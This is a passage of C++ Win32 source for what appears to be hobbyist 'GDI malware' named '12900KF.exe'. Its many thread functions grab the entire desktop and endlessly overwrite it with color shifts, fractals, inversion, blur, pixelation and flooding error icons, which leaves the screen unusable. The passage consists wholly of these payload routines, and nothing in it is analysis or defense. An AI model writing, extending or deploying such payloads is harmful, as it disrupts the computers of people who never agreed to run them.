            SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
            TextOutA(hdc, rand() % x, rand() % y, messages[i], strlen(messages[i]));
            Sleep(10);
        }
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI dsfv(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    
    RGBQUAD* rgbquad = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                FLOAT fx = (x + i) ^ (y + i);
                HSL hslcolor = Colors::rgb2hsl(rgbquad[index]);
                hslcolor.h = fmodf(fx / 300.f + y / (FLOAT)h * .1f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
    }
    return 0;
}

DWORD WINAPI IntelCorei912900(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                double fractalX = (2.5f / w);
                double fractalY = (1.90f / h);
                double cx = x * fractalX - 2.f;
                double cy = y * fractalY - 0.95f;
                double zx = 0;
                double zy = 0;
                int fx = 0;
                while (((zx * zx) + (zy * zy)) < 10 && fx < 50) {
                    double fczx = zx * zx - zy * zy + cx;
                    double fczy = 2 * zx * zy + cy;
                    zx = fczx;
                    zy = fczy;
                    fx++;
                    rgbquadCopy = rgbquad[index];
                    hslcolor = Colors::rgb2hsl(rgbquadCopy);
                    hslcolor.h = fmod((float)fx / 300.f + (float)y / h * .1f + (float)i / 1000.f, 1.f);
                    hslcolor.s = 0.7f;
                    hslcolor.l = 0.5f;
                    rgbquad[index] = Colors::hsl2rgb(hslcolor);
                }
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCINVERT);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI Verityisheree(LPVOID lpParam)
{
    HDC hdc;
    int sx = 0, sy = 0;
    LPCWSTR lpText = L"12900KF.exe";
    while(1)
    {
        hdc = GetWindowDC(GetDesktopWindow());
        sx = GetSystemMetrics(0);
        sy = GetSystemMetrics(1);
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
		ReleaseDC(0, hdc);
        Sleep(10);
    }
}

DWORD WINAPI sfvdhvhsv(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, 4 * h * w, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 10)
            byte = rand()%0xff;
        for (int i = 0; w * h > i; ++i) {
            if (!(i % h) && !(rand() % 110))
                v = rand() % 24;
            *((BYTE*)data + 4 * i + v) -= 5;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}

DWORD WINAPI setpixel(LPVOID lpParam) {
    int y = GetSystemMetrics(SM_CYSCREEN);
    int x = GetSystemMetrics(SM_CXSCREEN);
    int yfull = GetSystemMetrics(SM_CYFULLSCREEN);
    int xfull = GetSystemMetrics(SM_CXFULLSCREEN);
    int rainbow = x - rand() % x - (x / 150 - 112) % 149;
    int inc = round(x / 100);
    round(y / 1);
    round(yfull / 100);
    round(xfull / 10);
    while (1) {
        HDC hdc = GetDC(0);
        for (int yp = 0; yp < y; ++yp) {
            for (int xp = 0; xp < x; ++xp) {
                int xa = inc * xp;
                SetPixel(hdc, xp, yp, RGB(xa, xa, xa));
                SetPixel(hdc, yp, rainbow, RGB(yfull, xa, xfull));
                SetPixel(hdc, rainbow, rainbow, RGB(rainbow, rainbow, rainbow));
                SetPixel(hdc, rainbow, yp, RGB(xfull, yfull, xfull));
            }
        }
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI Verityishere(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    int signX = 1;
    int signY = 1;
    int signX1 = 1;
    int signY1 = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
    LPCWSTR lpText = L"12900KF.exe";
    while (1) {
        HDC hdc = GetDC(0);
        x += incrementor * signX;
        y += incrementor * signY;
        int top_x = 0 + x;
        int top_y = 0 + y;
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutW(hdc, top_x, top_y, lpText, wcslen(lpText));
        if (y == GetSystemMetrics(SM_CYSCREEN))
        {
            signY = -1;
        }

        if (x == GetSystemMetrics(SM_CXSCREEN))
        {
            signX = -1;
        }

        if (y == 0)
        {
            signY = 1;
        }

        if (x == 0)
        {
            signX = 1;
        }
        Sleep(10);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI gdimalware(LPVOID lParam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	while (1) {
		hdc = GetDC(NULL);
		BitBlt(hdc, -1, 1, w, h, hdc, 2, 2, SRCINVERT);
		BitBlt(hdc, 1, -1, w, h, hdc, -2, -2, SRCINVERT);
		ReleaseDC(0, hdc);
	}
	return 0;
}

DWORD WINAPI TransparentBlt1(LPVOID lpParam)
{
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	COLORREF TransparentBltColor = (RGB(rand() % 255, rand() % 255, rand() % 255));
	while (1) {
		hdc = GetDC(0);
		TransparentBlt(hdc, rand() % 225, rand() % 225, sw, sh, hdc, rand() % 225, rand() % 225, rand() % 225, rand() % 225, TransparentBltColor);
		ReleaseDC(0, hdc);
	}
	return 0;
}

DWORD WINAPI octagon(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;

	while (1) {
		HDC hdc = GetDC(0);
		x += incrementor * signX;
		y += incrementor * signY;

		int centerX = x + 50;
		int centerY = y + 50;
		int radius = 50;

		POINT octagonPoints[8];
		for (int i = 0; i < 8; ++i) {
			double angle = 2.0 * M_PI * i / 8;
			octagonPoints[i].x = centerX + static_cast<int>(radius * cos(angle));
			octagonPoints[i].y = centerY + static_cast<int>(radius * sin(angle));
		}

		HBRUSH brush = CreateSolidBrush(Hue(239));
		SelectObject(hdc, brush);
		Polygon(hdc, octagonPoints, 8);

		if (centerY >= GetSystemMetrics(SM_CYSCREEN)) {
			signY = -1;
		}
		if (centerX >= GetSystemMetrics(SM_CXSCREEN)) {
			signX = -1;
		}
		if (centerY <= 0) {
			signY = 1;
		}
		if (centerX <= 0) {
			signX = 1;
		}
		Sleep(1);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
	return 0;
}

DWORD WINAPI blur1(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	RECT rekt;
	POINT wPt[3];
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	bmp = CreateDIBSection(hdc, &bmpi, 0, NULL, NULL, 0);
	SelectObject(hdcCopy, bmp);

	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;

	while (1) {
		hdc = GetDC(NULL);
		GetWindowRect(GetDesktopWindow(), &rekt);
		wPt[0].x = rand() % w; wPt[0].y = rand() % h;
		wPt[1].x = rand() % w; wPt[1].y = rand() % h;
		wPt[2].x = rand() % w; wPt[2].y = rand() % h;
		PlgBlt(hdcCopy, wPt, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
		ReleaseDC(0, hdc);
	}
	return 0x00;
}

DWORD WINAPI KF(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;
				int fx = (int)((i ^ 4) + (i * 4) * cbrt(x ^ y*i));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, -20, 0, screenWidth+40, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI i9gen12(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	RECT rekt;
	POINT wPt[3];
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	bmp = CreateDIBSection(hdc, &bmpi, 0, NULL, NULL, 0);
	SelectObject(hdcCopy, bmp);
	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;
	while (1) {
		hdc = GetDC(NULL);
		GetWindowRect(GetDesktopWindow(), &rekt);
		wPt[0].x = rekt.left - 10;
		wPt[0].y = rekt.top - 10;
		wPt[1].x = rekt.right + 10;
		wPt[1].y = rekt.top;
		wPt[2].x = rekt.left - 10;
		wPt[2].y = rekt.bottom + 10;
		PlgBlt(hdcCopy, wPt, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
		ReleaseDC(0, hdc);
	}
	return 0x00;
}

DWORD WINAPI IntelCorei9Gen12(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(SM_CXSCREEN);
		int y = GetSystemMetrics(SM_CYSCREEN);
		DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_WINLOGO), (rand() % 10 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 10 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
		DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_ERROR), (rand() % 10 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 10 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
		DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_QUESTION), (rand() % 10 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 10 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
		DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_WARNING), (rand() % 10 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 10 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
		DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_INFORMATION), (rand() % 10 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 10 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		Sleep(1);
	}
	return 0;
}

DWORD WINAPI pentagon(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (1) {
		HDC hdc = GetDC(0);
		x += incrementor * signX;
		y += incrementor * signY;
		int centerX = x + 50;
		int centerY = y + 50;
		int radius = 50;
		POINT pentagonPoints[5];
		for (int i = 0; i < 5; ++i) {
			double angle = 2.0 * M_PI * i / 5;
			pentagonPoints[i].x = centerX + static_cast<int>(radius * cos(angle));
			pentagonPoints[i].y = centerY + static_cast<int>(radius * sin(angle));
		}
		HBRUSH brush = CreateSolidBrush(Hue(239));
		SelectObject(hdc, brush);
		Polygon(hdc, pentagonPoints, 5);
		if (centerY >= GetSystemMetrics(SM_CYSCREEN)) {
			signY = -1;
		}
		if (centerX >= GetSystemMetrics(SM_CXSCREEN)) {
			signX = -1;
		}
		if (centerY <= 0) {
			signY = 1;
		}
		if (centerX <= 0) {
			signX = 1;
		}
		Sleep(1);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
	return 0;
}

DWORD WINAPI kldfvkj(LPVOID lpParam) {
	HDC hdc = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	for (;;) {
		hdc = GetDC(0);
		for (float i = 0; i < sw + sh; i += 0.99f) {
			int a = sin(angle) * 60;
			BitBlt(hdc, 0, i, sw, 1, hdc, a, i, SRCCOPY);
			angle += M_PI / 70;
			DeleteObject(&a); DeleteObject(&i);
		}
		ReleaseDC(wnd, hdc);
		DeleteDC(hdc); DeleteObject(wnd); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
	}
}

DWORD WINAPI efjegjherf(LPVOID lpvd) //credits to fr4ctalz, but pankoza modified it
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 4) + (i * 4) * sqrt(i*x ^ y));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}

DWORD WINAPI LTSC(LPVOID lpvd) //credits to fr4ctalz, but pankoza modified it
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 4) + (i * 4) * sqrt(RGB(5, 10, 15)));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}

DWORD WINAPI XdWindowsOS(LPVOID lpvd)
{
	//Credits to ArTicZera and Rekto
	HDC hdc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
	SelectObject(dcCopy, bmp);

	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;

	while (1) {
		hdc = GetDC(NULL);
		BitBlt(dcCopy, 1, 1, w, h, hdc, -2, -2, SRCCOPY);
		AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);
		//Sleep(rand() % 25);
		ReleaseDC(0, hdc);
	}
	return 0x00;
}

DWORD WINAPI idk(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        RGBQUAD rgbquadCopy;

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;
                FLOAT fx = (x^y) + (i + i * 10);

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .10f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;

        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
        Sleep(10);
    }

    return 0x00;
}

DWORD WINAPI pixelate(LPVOID lpvd)
{
    HDC hdc = GetDC(0);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(hdcCopy, bmp);

    while (1)
    {
        hdc = GetDC(0);
        SetStretchBltMode(hdcCopy, COLORONCOLOR);
        SetStretchBltMode(hdc, COLORONCOLOR);

        StretchBlt(hdcCopy, 0, 0, w / 9, h / 9, hdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w / 9, h / 9, SRCCOPY);

        ReleaseDC(0, hdc);
        Sleep(10);
    }

    return 0x00;
}

DWORD WINAPI IntelCorei912thGen(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    RGBQUAD* rgbScreen = NULL;
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&rgbScreen, 0, 0);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].rgbBlue += x & y;
            // XOR operation on individual color components instead of .rgb
            rgbScreen[i].rgbRed ^= 360;
            rgbScreen[i].rgbGreen ^= 360;
            rgbScreen[i].rgbBlue ^= 360;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        Sleep(10);
        ReleaseDC(NULL, hdcScreen); 
        DeleteDC(hdcScreen);
    }
}

DWORD WINAPI cnd(LPVOID lpvd)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;

                int fx = (int)((i ^ 4) + (i * 4) * cbrt(x | y));

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;

        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }

    return 0x00;
}

DWORD WINAPI cdvm(LPVOID lpvd)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    RECT rekt;
    POINT pt1[3];
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    int counter = M_PI * M_PI * M_PI;
    int xSize = h;
    int ySize = w / 45;
    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    SelectObject(hdcCopy, bmp);

    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 10;

    while (1) {
        for (int i = 0; i < h / 3; i++) {
            hdc = GetDC(NULL);
            GetWindowRect(GetDesktopWindow(), &rekt);
            pt1[0].x = rekt.left + counter;
            pt1[0].y = rekt.top - sin(i / ((float)xSize) * M_PI) * (ySize);
            pt1[1].x = rekt.right + counter;
            pt1[1].y = rekt.top + counter;
            pt1[2].x = rekt.left - counter;
            pt1[2].y = rekt.bottom - counter;
            PlgBlt(hdcCopy, pt1, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
            AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
            ReleaseDC(0, hdc);
        }
    }
    return 0x00;
}

DWORD WINAPI last(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, 0);
	SelectObject(hdcMem, hbmTemp);
